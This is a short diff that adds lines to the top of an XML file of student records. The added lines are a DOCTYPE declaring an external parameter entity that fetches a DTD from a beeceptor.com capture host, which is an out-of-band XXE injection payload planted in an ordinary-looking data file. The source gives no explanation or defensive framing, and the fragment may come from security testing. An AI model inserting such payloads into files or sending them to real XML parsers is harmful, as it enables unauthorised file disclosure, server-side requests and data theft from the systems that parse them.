@@ -1,3 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"https://hoangmit.free.beeceptor.com/hoang.dtd"> %xxe;]>
 <students>
 	<student>
 		<name>Hoang</name>
